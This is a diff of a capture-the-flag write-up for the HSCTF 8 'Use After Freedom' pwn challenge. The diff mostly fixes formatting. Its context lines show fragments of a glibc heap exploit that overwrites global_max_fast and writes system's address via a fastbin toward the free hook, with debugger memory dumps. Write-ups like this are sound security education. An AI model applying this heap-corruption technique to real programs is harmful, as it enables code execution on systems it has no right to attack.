@@ -1,4 +1,4 @@
-## Use After Freedo
+## Use After Freedom
 
 > Points: 493
 >
@@ -9,7 +9,6 @@
 Use after free vulnerabilities are easy to exploit, right?
 
 nc use-after-freedom.hsc.tf 1337
-
 ```
 
 ### Files:
@@ -19,6 +18,8 @@ libc-2.27.so
 ```
 
 ## Analysis:
+
+Check security
 ```asm
 $ checksec use_after_freedom
 [*] '/home/mito/CTF/HSCTF_8/Pwn_Use_After_Freedom/use_after_freedom'
@@ -89,6 +90,7 @@ pwndbg> x/30gx 0x555555756000
 
 We can write a large value to global_max_fast with the following command.
 > Change(0, p64(libc_leak) + p64(global_max_fast - 0x10))
+>
 > Obtain((FREE_HOOK - MAIN_ARENA)*2-0x10, "C") #2
 ```asm
 0x7ffff7dcf930 <dumped_main_arena_end>:	0x0000000000000000	0x0000000000000000
@@ -98,6 +100,7 @@ We can write a large value to global_max_fast with the following command.
 
 We write to the extended fastbin with the following command.
 > Lose(2)
+> 
 > Change(0, p64(system_addr))
 ```asm
 0x555555757250:	0x0000000000000000	0x0000000000003951
